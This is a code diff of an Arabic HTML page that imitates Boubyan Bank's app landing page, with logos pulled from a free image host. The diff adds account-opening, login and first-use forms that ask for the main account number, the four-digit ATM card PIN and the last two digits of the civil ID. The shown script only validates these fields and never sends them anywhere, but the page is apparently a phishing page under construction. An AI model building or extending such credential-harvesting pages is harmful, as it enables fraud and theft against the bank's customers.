@@ -3,21 +3,21 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>بوبيان — فتح حساب</title>
+  <title>بوبيان — تطبيق</title>
 
-  <!-- Arabic webfont (Tajawal) -->
+  <!-- Arabic webfont -->
   <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;700;900&display=swap" rel="stylesheet">
 
   <style>
     :root{
-      --bg: #eceaea;           /* page background */
-      --card-bg: transparent;  /* content area (keeps grey look) */
-      --primary: #ff4d4d;      /* main red button */
-      --primary-dark: #e43f3f;
+      --bg: #eceaea;
+      --primary: #ff3b30;
+      --primary-dark: #e0322a;
       --accent: #c84a4a;
-      --text: #111;
+      --card-radius: 18px;
+      --max-width: 420px;
     }
-
+    * { box-sizing: border-box; }
     html,body{
       height:100%;
       margin:0;
@@ -25,39 +25,37 @@
       background: var(--bg);
       -webkit-font-smoothing:antialiased;
       -moz-osx-font-smoothing:grayscale;
-      color:var(--text);
+      color:#111;
     }
 
-    /* center the demo content and constrain width to look like the screenshot */
+    /* container */
     .wrap{
       min-height:100%;
       display:flex;
       align-items:flex-start;
       justify-content:center;
       padding:28px 18px 48px;
-      box-sizing:border-box;
+    }
+    .frame{
+      width:100%;
+      max-width:var(--max-width);
     }
 
     .card{
-      width:100%;
-      max-width:420px;
-      background:var(--card-bg);
-      border-radius:18px;
-      padding:18px 18px 30px;
-      box-sizing:border-box;
+      background:transparent;
+      border-radius:var(--card-radius);
+      padding:12px 14px 24px;
       text-align:center;
     }
 
-    /* logo at top */
     .logo{
       display:block;
-      margin:8px auto 18px;
-      width:160px;
-      max-width:46%;
+      margin:8px auto 12px;
+      width:180px;
+      max-width:68%;
       height:auto;
     }
 
-    /* big illustrative image */
     .hero{
       display:block;
       margin:6px auto 18px;
@@ -66,29 +64,26 @@
       height:auto;
     }
 
-    h1{
+    h1,h2{
       font-size:22px;
       line-height:1.35;
-      margin:28px 12px 12px;
+      margin:18px 12px 12px;
       font-weight:800;
-      color:#111;
     }
-
     p.lead{
       font-size:16px;
       line-height:1.9;
-      margin:10px 18px 24px;
+      margin:8px 18px 24px;
       color:#1b1b1b;
       font-weight:400;
     }
 
-    /* buttons */
     .actions{
       display:flex;
       flex-direction:column;
       gap:14px;
       padding:0 18px;
-      margin-top:8px;
+      margin-top:6px;
     }
 
     .btn{
@@ -100,20 +95,17 @@
       font-weight:700;
       text-decoration:none;
       cursor:pointer;
-      box-sizing:border-box;
       transition:transform .12s ease, box-shadow .12s ease;
       border:0;
     }
-
     .btn:active{ transform:translateY(1px); }
 
     .btn-primary{
       background: linear-gradient(180deg,var(--primary) 0%, var(--primary-dark) 100%);
       color:#fff;
-      box-shadow: 0 6px 18px rgba(244,76,76,0.18), inset 0 -3px 0 rgba(0,0,0,0.03);
+      box-shadow: 0 6px 18px rgba(255,59,48,0.18), inset 0 -3px 0 rgba(0,0,0,0.03);
       border: 1px solid rgba(0,0,0,0.02);
     }
-
     .btn-secondary{
       background:#fff;
       color:var(--accent);
@@ -122,41 +114,301 @@
       font-weight:800;
     }
 
-    /* subtle large spacing like mobile screenshot */
-    .spacer{
-      height:18px;
+    /* shared view base */
+    .view { display:none; opacity:0; transform: translateY(8px); transition: opacity .18s ease, transform .18s ease; }
+    .view.show { display:block; opacity:1; transform: translateY(0); }
+
+    /* signup/login/start forms */
+    .form-card{
+      background:#ffffffcc;
+      padding:18px;
+      border-radius:16px;
+      margin-top:8px;
+      text-align:right;
     }
 
-    /* small responsive tweaks */
+    .form-card .field{
+      margin:18px 0;
+      text-align:right;
+    }
+    .form-card label{
+      display:block;
+      font-size:18px;
+      margin-bottom:8px;
+      font-weight:600;
+    }
+    .hint{
+      display:block;
+      font-size:13px;
+      color:#666;
+      margin-bottom:8px;
+    }
+    .input{
+      width:100%;
+      padding:14px 16px;
+      border-radius:12px;
+      border:0;
+      box-shadow: 0 6px 14px rgba(0,0,0,0.06), inset 0 -2px 0 rgba(255,255,255,0.6);
+      font-size:16px;
+      background:#fff;
+      text-align:left;
+      direction:ltr;
+    }
+    .input[aria-invalid="true"]{ outline:2px solid #ffcccc; }
+
+    .form-actions{
+      margin-top:18px;
+      display:flex;
+      gap:12px;
+      align-items:center;
+      justify-content:flex-start;
+    }
+    .back-link{ margin-right:auto; color:#666; font-weight:700; text-decoration:none; }
+
+    .link-muted{ display:block; color:#c62828; text-decoration:underline; cursor:pointer; margin-top:18px; text-align:center; }
+
     @media (min-width:520px){
-      .card{ padding:26px; border-radius:20px; }
       h1{ font-size:24px; }
-      .hero{ width:60%; }
+      .card{ padding:20px; }
     }
   </style>
 </head>
 <body>
   <div class="wrap">
-    <main class="card" role="main" aria-labelledby="title">
-      <!-- الشعار الموفَر من المستخدم -->
-      <img class="logo" src="https://c.top4top.io/p_3661ckayw0.jpeg" alt="شعار بوبيان">
+    <div class="frame">
+      <!-- HOME VIEW -->
+      <main id="home" class="card view show" aria-labelledby="home-title">
+        <img class="logo" id="homeLogo" src="https://d.top4top.io/p_3661yey5x0.jpeg" alt="شعار بوبيان">
 
-      <!-- الصورة الثانية (الرسم التوضيحي) -->
-      <img class="hero" src="https://d.top4top.io/p_3661baz240.jpeg" alt="رسم توضيحي">
+        <img class="hero" id="homeHero" src="https://c.top4top.io/p_3661azqy73.jpeg" alt="صورة توضيحية">
 
-      <h1 id="title">تطبيق بوبيان بنك متكامل في موبايلك</h1>
+        <h1 id="home-title">تطبيق بوبيان بنك متكامل في موبايلك</h1>
+        <p class="lead">الفائز بجائزة أفضل تطبيق مصرفي. تطبيقنا يوفر لك باقة لا متناهية من الخدمات والمميزات على مدار الساعة وطوال أيام الأسبوع</p>
 
-      <p class="lead">
-        الفائز بجائزة أفضل تطبيق مصرفي. تطبيقنا يوفر لك باقة لا متناهية من الخدمات والمميزات على مدار الساعة وطوال أيام الأسبوع
-      </p>
+        <div class="actions" role="group" aria-label="إجراءات">
+          <button id="openSignupBtn" class="btn btn-primary" aria-label="افتح حسابك الجديد في بوبيان">افتح حسابك الجديد في بوبيان</button>
 
-      <div class="actions" role="group" aria-label="إجراءات">
-        <a href="#" class="btn btn-primary" aria-label="افتح حسابك الجديد في بوبيان">افتح حسابك الجديد في بوبيان</a>
-        <a href="#" class="btn btn-secondary" aria-label="لديك حساب في بوبيان">لديك حساب في بوبيان</a>
-      </div>
+          <!-- هذا الزر الآن يفتح صفحة الدخول (لديك حساب) -->
+          <button id="haveAccountBtn" class="btn btn-secondary" aria-label="لديك حساب في بوبيان">لديك حساب في بوبيان</button>
+        </div>
+      </main>
 
-      <div class="spacer" aria-hidden="true"></div>
-    </main>
+      <!-- SIGNUP VIEW -->
+      <section id="signup" class="view" aria-labelledby="signup-title" role="region" aria-hidden="true">
+        <div class="form-card">
+          <img class="logo" src="https://h.top4top.io/p_36619yylq0.jpeg" alt="شعار بوبيان — تسجيل">
+          <h2 id="signup-title">فتح حساب جديد</h2>
+
+          <form id="signupForm" novalidate>
+            <div class="field">
+              <label for="acc">رقم الحساب الرئيسي</label>
+              <span class="hint">مكون من عشرة أرقام *</span>
+              <input id="acc" name="acc" class="input" type="tel" inputmode="numeric" maxlength="10" placeholder="مثال: 1234567890" required>
+            </div>
+
+            <div class="field">
+              <label for="pin">الرقم السري لبطاقة السحب الآلي</label>
+              <span class="hint">مكون من أربعة أرقام *</span>
+              <input id="pin" name="pin" class="input" type="password" inputmode="numeric" maxlength="4" placeholder="••••" required>
+            </div>
+
+            <div class="field">
+              <label for="nid">البطاقة المدنية</label>
+              <span class="hint">آخر رقمين من البطاقة المدنية *</span>
+              <input id="nid" name="nid" class="input" type="tel" inputmode="numeric" maxlength="2" placeholder="مثال: 45" required>
+            </div>
+
+            <div class="form-actions">
+              <a href="#" id="signupBack" class="back-link" role="button">العودة</a>
+              <button type="submit" class="btn btn-primary" style="width:160px;">التالي</button>
+            </div>
+          </form>
+        </div>
+      </section>
+
+      <!-- LOGIN VIEW (لديك حساب في بوبيان) -->
+      <section id="login" class="view" aria-labelledby="login-title" role="region" aria-hidden="true">
+        <div class="form-card">
+          <!-- شعار الصورة الذي طلبته -->
+          <img class="logo" src="https://h.top4top.io/p_36619yylq0.jpeg" alt="شعار بوبيان — دخول">
+
+          <h2 id="login-title">تسجيل الدخول</h2>
+
+          <form id="loginForm" novalidate>
+            <div class="field">
+              <label for="username">اسم المستخدم</label>
+              <input id="username" name="username" class="input" type="text" placeholder="اسم المستخدم" autocomplete="username">
+            </div>
+
+            <a id="forgotUsername" class="link-muted" role="button">نسيت اسم المستخدم ؟</a>
+
+            <div class="field">
+              <label for="loginNid">البطاقة المدنية</label>
+              <span class="hint">آخر رقمين من البطاقة المدنية *</span>
+              <input id="loginNid" name="loginNid" class="input" type="tel" inputmode="numeric" maxlength="2" placeholder="مثال: 45" required>
+            </div>
+
+            <div class="form-actions">
+              <a href="#" id="loginBack" class="back-link" role="button">العودة</a>
+              <button type="submit" class="btn btn-primary" style="width:160px;">التالي</button>
+            </div>
+
+            <div style="margin-top:18px; text-align:center;">
+              <div style="font-weight:600; margin-bottom:6px;">تسجيل لأول مرة</div>
+              <div style="color:#666; margin-bottom:6px;">إذا كنت تستخدم التطبيق لأول مرة</div>
+              <!-- هذا الرابط هو "اضغط هنا للبدء" الذي يفتح صفحة البدء -->
+              <a id="startHere" class="link-muted">اضغط هنا للبدء</a>
+            </div>
+          </form>
+        </div>
+      </section>
+
+      <!-- START VIEW (الصفحة المشابهة للصورة الثانية) -->
+      <section id="start" class="view" aria-labelledby="start-title" role="region" aria-hidden="true">
+        <div class="form-card">
+          <img class="logo" src="https://h.top4top.io/p_36619yylq0.jpeg" alt="شعار بوبيان ��� البدء">
+
+          <h2 id="start-title">بدء الاستخدام</h2>
+
+          <form id="startForm" novalidate>
+            <div class="field">
+              <label for="startAcc">رقم الحساب الرئيسي</label>
+              <span class="hint">مكون من عشرة أرقام *</span>
+              <input id="startAcc" name="startAcc" class="input" type="tel" inputmode="numeric" maxlength="10" placeholder="مثال: 1234567890" required>
+            </div>
+
+            <div class="field">
+              <label for="startPin">الرقم السري لبطاقة السحب الآلي</label>
+              <span class="hint">مكون من أربعة أرقام *</span>
+              <input id="startPin" name="startPin" class="input" type="password" inputmode="numeric" maxlength="4" placeholder="••••" required>
+            </div>
+
+            <div class="field">
+              <label for="startNid">البطاقة المدنية</label>
+              <span class="hint">آخر رقمين من البطاقة المدنية *</span>
+              <input id="startNid" name="startNid" class="input" type="tel" inputmode="numeric" maxlength="2" placeholder="مثال: 45" required>
+            </div>
+
+            <div class="form-actions">
+              <a href="#" id="startBack" class="back-link" role="button">العودة</a>
+              <button type="submit" class="btn btn-primary" style="width:160px;">التالي</button>
+            </div>
+          </form>
+        </div>
+      </section>
+
+    </div>
   </div>
+
+  <script>
+    // عناصر
+    const homeView = document.getElementById('home');
+    const signupView = document.getElementById('signup');
+    const loginView = document.getElementById('login');
+    const startView = document.getElementById('start');
+
+    const openSignupBtn = document.getElementById('openSignupBtn');
+    const haveAccountBtn = document.getElementById('haveAccountBtn');
+
+    const signupBack = document.getElementById('signupBack');
+    const loginBack = document.getElementById('loginBack');
+    const startBack = document.getElementById('startBack');
+
+    const startHere = document.getElementById('startHere');
+
+    // اظهار/اخفاء وظائف عامة
+    function showView(name, push=true){
+      // hide all
+      [homeView, signupView, loginView, startView].forEach(v => {
+        v.classList.remove('show');
+        v.setAttribute('aria-hidden','true');
+      });
+
+      let view;
+      if (name === 'home') view = homeView;
+      else if (name === 'signup') view = signupView;
+      else if (name === 'login') view = loginView;
+      else if (name === 'start') view = startView;
+      else view = homeView;
+
+      view.classList.add('show');
+      view.setAttribute('aria-hidden','false');
+
+      if (push){
+        if (name === 'home') location.hash = '';
+        else location.hash = '#' + name;
+      }
+      // focus مناسب
+      setTimeout(() => {
+        const firstInput = view.querySelector('input, button, a');
+        if (firstInput) firstInput.focus();
+      }, 80);
+    }
+
+    // أحداث ربط
+    openSignupBtn.addEventListener('click', (e) => { e.preventDefault(); showView('signup', true); });
+    haveAccountBtn.addEventListener('click', (e) => { e.preventDefault(); showView('login', true); });
+
+    signupBack.addEventListener('click', (e) => { e.preventDefault(); showView('home', true); });
+    loginBack.addEventListener('click', (e) => { e.preventDefault(); showView('home', true); });
+    startBack.addEventListener('click', (e) => { e.preventDefault(); showView('login', true); });
+
+    startHere.addEventListener('click', (e) => { e.preventDefault(); showView('start', true); });
+
+    // نماذج: تحقق بسيط
+    function simpleValidate(pattern, input, message){
+      input.setAttribute('aria-invalid','false');
+      if (!pattern.test(input.value.trim())){
+        input.setAttribute('aria-invalid','true');
+        alert(message);
+        input.focus();
+        return false;
+      }
+      return true;
+    }
+
+    document.getElementById('signupForm').addEventListener('submit', (e) => {
+      e.preventDefault();
+      const acc = document.getElementById('acc');
+      const pin = document.getElementById('pin');
+      const nid = document.getElementById('nid');
+      if (!simpleValidate(/^\d{10}$/, acc, 'رقم الحساب يجب أن يكون 10 أرقام')) return;
+      if (!simpleValidate(/^\d{4}$/, pin, 'الرقم السري يجب أن يكون 4 أرقام')) return;
+      if (!simpleValidate(/^\d{2}$/, nid, 'ادخل آخر رقمين من البطاقة')) return;
+      alert('تم التحقق — متابعة التسجيل.');
+      showView('home', true);
+    });
+
+    document.getElementById('loginForm').addEventListener('submit', (e) => {
+      e.preventDefault();
+      const loginNid = document.getElementById('loginNid');
+      if (!simpleValidate(/^\d{2}$/, loginNid, 'ادخل آخر رقمين من البطاقة')) return;
+      alert('تم التحقق — تسجيل الدخول (تجريبي).');
+      showView('home', true);
+    });
+
+    document.getElementById('startForm').addEventListener('submit', (e) => {
+      e.preventDefault();
+      const startAcc = document.getElementById('startAcc');
+      const startPin = document.getElementById('startPin');
+      const startNid = document.getElementById('startNid');
+      if (!simpleValidate(/^\d{10}$/, startAcc, 'رقم الحساب يجب أن يكون 10 أرقام')) return;
+      if (!simpleValidate(/^\d{4}$/, startPin, 'الرقم السري يجب أن يكون 4 أرقام')) return;
+      if (!simpleValidate(/^\d{2}$/, startNid, 'ادخل آخر رقمين من البطاقة')) return;
+      alert('تم التحقق — متابعة البدء.');
+      showView('home', true);
+    });
+
+    // التعامل مع الهَش (hash) عند التحميل أو تغييره
+    function handleHash(){
+      const h = location.hash.replace('#','');
+      if (h === 'signup') showView('signup', false);
+      else if (h === 'login') showView('login', false);
+      else if (h === 'start') showView('start', false);
+      else showView('home', false);
+    }
+    window.addEventListener('hashchange', handleHash);
+    window.addEventListener('load', handleHash);
+  </script>
 </body>
 </html>
